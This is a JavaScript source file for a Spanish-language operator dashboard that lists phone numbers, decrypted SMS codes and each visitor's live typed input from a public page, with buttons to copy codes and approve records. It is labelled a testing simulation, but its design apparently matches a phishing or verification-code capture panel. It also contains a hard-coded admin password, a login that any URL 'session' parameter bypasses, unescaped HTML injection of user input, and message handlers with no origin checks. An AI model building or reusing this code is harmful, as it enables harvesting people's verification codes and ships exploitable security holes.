// ============================================================================
// Standalone Control & Real-Time Traceability Dashboard (panel.js)
// Mode: Testing Simulation without paid SMS provider
// Multi-Tier Real-Time Sync: SSE, REST, BroadcastChannel & window.postMessage
// ============================================================================
const ADMIN_SESSION_KEY = 'vx_admin_session';
const STORAGE_KEY = 'vx_encrypted_registry_db_v1';
const TRACE_LOG_KEY = 'vx_realtime_trace_log_v1';
const KEY_STORAGE = 'vx_aes_master_key_v1';
const CHANNEL_NAME = 'vx_realtime_trace_channel';

const realtimeChannel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(CHANNEL_NAME) : null;
window.clientRef = null;

function getServerApiUrl(endpoint) {
  if (window.location.protocol.startsWith('http')) {
    return endpoint;
  }
  return `http://localhost:3000${endpoint}`;
}

// UI Elements
const kpiTotal = document.getElementById('kpiTotal');
const kpiPending = document.getElementById('kpiPending');
const kpiVerified = document.getElementById('kpiVerified');
const kpiEvents = document.getElementById('kpiEvents');
const panelRecordsBody = document.getElementById('panelRecordsBody');
const liveTraceFeed = document.getElementById('liveTraceFeed');
const exportEncryptedBtn = document.getElementById('exportEncryptedBtn');
const clearRecordsBtn = document.getElementById('clearRecordsBtn');

// Auth UI Elements
const adminLoginGate = document.getElementById('adminLoginGate');
const closeGateBtn = document.getElementById('closeGateBtn');
const gateLoginForm = document.getElementById('gateLoginForm');
const gateEmailInput = document.getElementById('gateEmailInput');
const gatePassInput = document.getElementById('gatePassInput');
const gateFeedback = document.getElementById('gateFeedback');
const adminUserEmail = document.getElementById('adminUserEmail');
const adminSessionPill = document.getElementById('adminSessionPill');
const adminLogoutBtn = document.getElementById('adminLogoutBtn');

// ----------------------------------------------------------------------------
// 1. Session Synchronization from URL Query (Never ask to log in twice!)
// ----------------------------------------------------------------------------
(function syncSessionFromUrl() {
  try {
    const params = new URLSearchParams(window.location.search);
    const sessionParam = params.get('session');
    if (sessionParam) {
      const decoded = atob(decodeURIComponent(sessionParam));
      const parsed = JSON.parse(decoded);
      if (parsed && parsed.email) {
        localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify(parsed));
        // Clean URL parameter without reloading
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    }
  } catch {}
})();

function getAdminSession() {
  try {
    const raw = localStorage.getItem(ADMIN_SESSION_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

function showGateFeedback(msg, isSuccess = false) {
  if (!gateFeedback) return;
  gateFeedback.textContent = msg;
  gateFeedback.className = isSuccess ? 'login-feedback login-feedback-success' : 'login-feedback login-feedback-error';
  gateFeedback.classList.remove('hidden');
}

function checkAdminAuth() {
  const session = getAdminSession();
  const isAuthorized = session && session.email && /^[a-zA-Z0-9._%+-]+@proton\.me$/i.test(session.email);

  if (!isAuthorized) {
    if (adminLoginGate) adminLoginGate.classList.remove('hidden');
    if (adminSessionPill) adminSessionPill.style.display = 'none';
    if (adminLogoutBtn) adminLogoutBtn.style.display = 'none';
    return false;
  }

  if (adminLoginGate) adminLoginGate.classList.add('hidden');
  if (adminSessionPill) adminSessionPill.style.display = 'inline-flex';
  if (adminLogoutBtn) adminLogoutBtn.style.display = 'inline-block';
  if (adminUserEmail) adminUserEmail.textContent = session.email;
  return true;
}

// Close / Minimize Gate Modal Handlers
if (closeGateBtn) {
  closeGateBtn.addEventListener('click', () => {
    if (adminLoginGate) adminLoginGate.classList.add('hidden');
  });
}

if (adminLoginGate) {
  adminLoginGate.addEventListener('click', (e) => {
    if (e.target === adminLoginGate) adminLoginGate.classList.add('hidden');
  });
}

window.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && adminLoginGate && !adminLoginGate.classList.contains('hidden')) {
    adminLoginGate.classList.add('hidden');
  }
});

// Gate Form Login Submit
if (gateLoginForm) {
  gateLoginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    const email = gateEmailInput.value.trim().toLowerCase();
    const pass = gatePassInput.value;

    const isProton = /^[a-zA-Z0-9._%+-]+@proton\.me$/i.test(email);
    const isPasswordValid = pass === 'HailLucifer';

    if (!isProton) {
      showGateFeedback('Acceso denegado: Se requiere un correo con dominio @proton.me.', false);
      gateEmailInput.focus();
      return;
    }

    if (!isPasswordValid) {
      showGateFeedback('Acceso denegado: Contraseña de pruebas incorrecta (HailLucifer).', false);
      gatePassInput.focus();
      return;
    }

    const session = {
      email,
      role: 'Administrador Autorizado',
      token: 'ADM-' + Math.random().toString(36).substring(2, 9).toUpperCase(),
      loginTime: new Date().toISOString()
    };
    localStorage.setItem(ADMIN_SESSION_KEY, JSON.stringify(session));

    showGateFeedback('✓ Acceso concedido. Abriendo Portal...', true);

    setTimeout(() => {
      checkAdminAuth();
      renderDashboard();
    }, 300);
  });
}

if (adminLogoutBtn) {
  adminLogoutBtn.addEventListener('click', () => {
    if (confirm('¿Cerrar sesión de administrador?')) {
      localStorage.removeItem(ADMIN_SESSION_KEY);
      window.location.href = 'index.html';
    }
  });
}

// ----------------------------------------------------------------------------
// 2. AES-256-GCM Storage Helpers
// ----------------------------------------------------------------------------
async function getOrCreateAesKey() {
  const storedRaw = localStorage.getItem(KEY_STORAGE);
  if (storedRaw) {
    const keyBytes = Uint8Array.from(atob(storedRaw), (c) => c.charCodeAt(0));
    return window.crypto.subtle.importKey('raw', keyBytes, { name: 'AES-GCM' }, true, ['encrypt', 'decrypt']);
  }
  const key = await window.crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
  const exported = await window.crypto.subtle.exportKey('raw', key);
  const b64Key = btoa(String.fromCharCode(...new Uint8Array(exported)));
  localStorage.setItem(KEY_STORAGE, b64Key);
  return key;
}

async function decryptPayload(token) {
  const [ivB64, cipherB64] = token.split('.');
  const key = await getOrCreateAesKey();
  const iv = Uint8Array.from(atob(ivB64), (c) => c.charCodeAt(0));
  const cipherBytes = Uint8Array.from(atob(cipherB64), (c) => c.charCodeAt(0));
  const plainBuffer = await window.crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, cipherBytes);
  return JSON.parse(new TextDecoder().decode(plainBuffer));
}

function loadRawDatabase() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  } catch {
    return [];
  }
}

function saveRawDatabase(records) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
}

function loadTraceLogs() {
  try {
    return JSON.parse(localStorage.getItem(TRACE_LOG_KEY) || '[]');
  } catch {
    return [];
  }
}

function saveTraceLogs(logs) {
  localStorage.setItem(TRACE_LOG_KEY, JSON.stringify(logs));
}

function appendPanelTraceEvent(eventObj) {
  const logs = loadTraceLogs();
  const entry = {
    eventId: 'EVT-' + Math.random().toString(36).substring(2, 7).toUpperCase(),
    timestamp: new Date().toLocaleTimeString('es-MX', { hour12: false }),
    ...eventObj
  };
  logs.unshift(entry);
  saveTraceLogs(logs.slice(0, 60));
}

// ----------------------------------------------------------------------------
// 3. Render Dashboard: KPIs, Traceability Matrix & Real-Time Audit Feed
// ----------------------------------------------------------------------------
async function renderDashboard() {
  const db = loadRawDatabase();
  const logs = loadTraceLogs();

  const totalCount = db.length;
  const verifiedCount = db.filter((r) => r.status === 'VERIFICADO').length;
  const pendingCount = totalCount - verifiedCount;

  if (kpiTotal) kpiTotal.textContent = totalCount;
  if (kpiPending) kpiPending.textContent = pendingCount;
  if (kpiVerified) kpiVerified.textContent = verifiedCount;
  if (kpiEvents) kpiEvents.textContent = logs.length;

  if (!panelRecordsBody) return;

  if (db.length === 0) {
    panelRecordsBody.innerHTML =
      '<tr><td colspan="7" class="empty-row">Esperando registros desde la página principal en tiempo real...</td></tr>';
  } else {
    const rowsHtml = await Promise.all(
      db.map(async (rec) => {
        let plain = { phone: rec.maskedPhone, alphaCode: '******' };
        try {
          plain = await decryptPayload(rec.encryptedEnvelope);
        } catch {
          // Key rotated or unparsed
        }

        const isVerified = rec.status === 'VERIFICADO';
        const isFailed = rec.status === 'CODIGO_INCORRECTO';
        const liveInput = rec.liveUserInput || 'Esperando captura...';
        const exactMatch = liveInput === plain.alphaCode;

        let statusClass = 'status-pending';
        let statusText = '⏳ En espera de código';
        if (isVerified) {
          statusClass = 'status-verified';
          statusText = '✓ Verificado en Mercado';
        } else if (isFailed) {
          statusClass = 'status-error';
          statusText = '⚠️ Código Incorrecto';
        }

        return `
          <tr class="${isVerified ? 'row-verified' : ''}">
            <td>
              <strong>${rec.id}</strong><br>
              <span class="trace-id-inline">${rec.traceId || 'TRC-N/A'}</span><br>
              <small style="color:#64748b;">${rec.updatedAt}</small>
            </td>
            <td>
              <div class="phone-solicitante-col">
                <strong class="phone-number-display">${plain.phone}</strong>
                <span class="sms-testing-badge">📲 Solicitó SMS</span>
                <small class="sms-provider-omitted-note">Modo testing (Sin SMS real)</small>
              </div>
            </td>
            <td>
              <div class="assigned-code-col">
                <span class="assigned-code-pill" title="Código SMS que entrarían ellos">${plain.alphaCode}</span>
                <button type="button" class="btn-copy-code" data-copy-code="${plain.alphaCode}" title="Copiar código al portapapeles">
                  📋 Copiar
                </button>
              </div>
            </td>
            <td>
              <div class="live-input-box ${exactMatch ? 'live-match' : ''}">
                <code>${liveInput}</code>
                <small>${exactMatch ? '✓ Coincide exactamente' : 'Intentos: ' + (rec.attempts || 0)}</small>
              </div>
            </td>
            <td>
              <div class="cipher-cell" title="${rec.encryptedEnvelope}">${rec.encryptedEnvelope}</div>
            </td>
            <td>
              <span class="status-badge ${statusClass}">${statusText}</span>
            </td>
            <td>
              ${
                isVerified
                  ? '<span style="color:#16a34a; font-size:0.8rem; font-weight:700;">✓ Activo</span>'
                  : `<button type="button" class="btn btn-primary btn-xs" data-verify-id="${rec.id}">Aprobar / Verificar</button>`
              }
            </td>
          </tr>
        `;
      })
    );
    panelRecordsBody.innerHTML = rowsHtml.join('');
  }

  // Render Live Audit Feed
  if (!liveTraceFeed) return;

  if (logs.length === 0) {
    liveTraceFeed.innerHTML = '<div class="trace-empty">Sin eventos recientes.</div>';
  } else {
    liveTraceFeed.innerHTML = logs
      .map(
        (item) => `
        <div class="trace-event-card">
          <div class="trace-event-top">
            <span class="trace-event-action">${item.action}</span>
            <span class="trace-event-time">${item.timestamp}</span>
          </div>
          <div class="trace-event-meta">
            <strong>${item.regId || ''}</strong> · <span>${item.traceId || ''}</span> · <span>${item.phone || ''}</span>
          </div>
          <p class="trace-event-detail">${item.detail}</p>
        </div>
      `
      )
      .join('');
  }
}

function applyLiveInputLocally(regId, input) {
  const db = loadRawDatabase();
  const record = db.find((r) => r.id === regId);
  if (record) {
    record.liveUserInput = input;
    record.updatedAt = new Date().toLocaleTimeString('es-MX', { hour12: false });
    saveRawDatabase(db);
    renderDashboard();
  }
}

// ----------------------------------------------------------------------------
// 4. Action Listeners (Verify & Copy Code)
// ----------------------------------------------------------------------------
if (panelRecordsBody) {
  panelRecordsBody.addEventListener('click', async (e) => {
    // 1. Copy code button
    const copyBtn = e.target.closest('[data-copy-code]');
    if (copyBtn) {
      const code = copyBtn.getAttribute('data-copy-code');
      try {
        await navigator.clipboard.writeText(code);
        const originalText = copyBtn.innerHTML;
        copyBtn.innerHTML = '✓ Copiado';
        copyBtn.style.background = '#dcfce7';
        copyBtn.style.color = '#15803d';
        setTimeout(() => {
          copyBtn.innerHTML = originalText;
          copyBtn.style.background = '';
          copyBtn.style.color = '';
        }, 1800);
      } catch {
        prompt('Código asignado que entrarían ellos:', code);
      }
      return;
    }

    // 2. Manual Approve / Verify button
    const verifyBtn = e.target.closest('[data-verify-id]');
    if (verifyBtn) {
      const targetId = verifyBtn.getAttribute('data-verify-id');
      const db = loadRawDatabase();
      const record = db.find((r) => r.id === targetId);
      if (record) {
        record.status = 'VERIFICADO';
        record.updatedAt = new Date().toLocaleString('es-MX');
        saveRawDatabase(db);

        appendPanelTraceEvent({
          regId: record.id,
          traceId: record.traceId,
          phone: record.maskedPhone,
          action: 'APROBADO_DESDE_PANEL',
          detail: `Operador de Mi Portal verificó manualmente el registro ${record.id} para operar en el mercado.`
        });

        // 1. BroadcastChannel
        if (realtimeChannel) {
          try {
            realtimeChannel.postMessage({ type: 'PANEL_ACTION', regId: record.id });
          } catch {}
        }

        // 2. Cross-window postMessage
        try {
          if (window.opener && !window.opener.closed) {
            window.opener.postMessage({ type: 'PANEL_ACTION', regId: record.id }, '*');
          }
          if (window.clientRef && !window.clientRef.closed) {
            window.clientRef.postMessage({ type: 'PANEL_ACTION', regId: record.id }, '*');
          }
        } catch {}

        // 3. Server Sync POST
        try {
          fetch(getServerApiUrl('/api/sync'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'PANEL_ACTION', db, logs: loadTraceLogs(), regId: record.id })
          }).catch(() => {});
        } catch {}

        await renderDashboard();
      }
    }
  });
}

// Export Encrypted Database Backup (.json)
if (exportEncryptedBtn) {
  exportEncryptedBtn.addEventListener('click', () => {
    const db = loadRawDatabase();
    const logs = loadTraceLogs();
    const exportPayload = {
      policyCompliance: 'LFPDPPP-MX / NOM-151',
      cipherAlgorithm: 'AES-256-GCM + SHA-256',
      smsSimulationMode: 'TESTING_ACTIVE (No external provider charged)',
      exportedAt: new Date().toISOString(),
      records: db,
      traceAuditLog: logs
    };
    const blob = new Blob([JSON.stringify(exportPayload, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `trazabilidad-cifrada-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  });
}

// Clear Database & Logs
if (clearRecordsBtn) {
  clearRecordsBtn.addEventListener('click', async () => {
    if (confirm('¿Deseas vaciar la base de datos de pruebas y la bitácora de trazabilidad?')) {
      localStorage.removeItem(STORAGE_KEY);
      localStorage.removeItem(TRACE_LOG_KEY);

      if (realtimeChannel) {
        try { realtimeChannel.postMessage({ type: 'PANEL_ACTION' }); } catch {}
      }

      try {
        fetch(getServerApiUrl('/api/sync'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'CLEAR_ALL' })
        }).catch(() => {});
      } catch {}

      await renderDashboard();
    }
  });
}

// "↗ Abrir Página Pública" Button handler with session preserved
document.querySelectorAll('a[href="index.html"]').forEach((link) => {
  link.addEventListener('click', (e) => {
    e.preventDefault();
    const session = getAdminSession();
    let url = 'index.html';
    if (session && session.email) {
      const token = encodeURIComponent(btoa(JSON.stringify(session)));
      url += `?session=${token}`;
    }
    window.clientRef = window.open(url, 'VX_CLIENT');
    if (!window.clientRef) window.location.href = url;
  });
});

// ----------------------------------------------------------------------------
// 5. Multi-Tier Real-Time Listeners (BroadcastChannel + postMessage + SSE + Poll)
// ----------------------------------------------------------------------------

// Tier 1: BroadcastChannel
if (realtimeChannel) {
  realtimeChannel.addEventListener('message', (event) => {
    if (event.data) {
      if (event.data.type === 'LIVE_INPUT') {
        applyLiveInputLocally(event.data.regId, event.data.input);
        return;
      }
      if (event.data.type === 'UPDATE_ALL' || event.data.type === 'TRACE_UPDATE') {
        if (Array.isArray(event.data.db)) saveRawDatabase(event.data.db);
        if (Array.isArray(event.data.logs)) saveTraceLogs(event.data.logs);
      }
      renderDashboard();
    }
  });
}

// Tier 2: window.postMessage (for file:// protocol cross-window support)
window.addEventListener('message', (event) => {
  if (event.data && typeof event.data === 'object') {
    if (event.data.type === 'VX_SYNC_ALL') {
      if (Array.isArray(event.data.db)) saveRawDatabase(event.data.db);
      if (Array.isArray(event.data.logs)) saveTraceLogs(event.data.logs);
      renderDashboard();
    }
    if (event.data.type === 'VX_LIVE_INPUT') {
      applyLiveInputLocally(event.data.regId, event.data.input);
    }
  }
});

// Request sync from opener if exists
try {
  if (window.opener && !window.opener.closed) {
    window.opener.postMessage({ type: 'VX_REQUEST_SYNC' }, '*');
  }
} catch {}

// Tier 3: Server-Sent Events (SSE) Stream from localhost:3000
(function initServerSync() {
  try {
    const sseUrl = getServerApiUrl('/api/events');
    if (typeof EventSource !== 'undefined') {
      const es = new EventSource(sseUrl);
      es.onmessage = (e) => {
        try {
          const data = JSON.parse(e.data);
          if (data.type === 'SNAPSHOT' || data.type === 'UPDATE') {
            if (Array.isArray(data.db)) saveRawDatabase(data.db);
            if (Array.isArray(data.logs)) saveTraceLogs(data.logs);
            renderDashboard();
          }
          if (data.action === 'LIVE_INPUT') {
            applyLiveInputLocally(data.regId, data.input);
          }
        } catch {}
      };
    }
  } catch {}
})();

// Tier 4: Background REST Polling Fallback (ensures sync even if tabs opened separately)
setInterval(async () => {
  try {
    const res = await fetch(getServerApiUrl('/api/sync'));
    if (res.ok) {
      const data = await res.json();
      const currentDb = loadRawDatabase();
      if (Array.isArray(data.db) && data.db.length > 0 && JSON.stringify(data.db) !== JSON.stringify(currentDb)) {
        saveRawDatabase(data.db);
        if (Array.isArray(data.logs)) saveTraceLogs(data.logs);
        renderDashboard();
      }
    }
  } catch {}
}, 1200);

// Storage Event Listener (same origin tabs)
window.addEventListener('storage', (e) => {
  if (e.key === STORAGE_KEY || e.key === TRACE_LOG_KEY || e.key === ADMIN_SESSION_KEY) {
    checkAdminAuth();
    renderDashboard();
  }
});

// ----------------------------------------------------------------------------
// Initialization
// ----------------------------------------------------------------------------
checkAdminAuth();
renderDashboard();
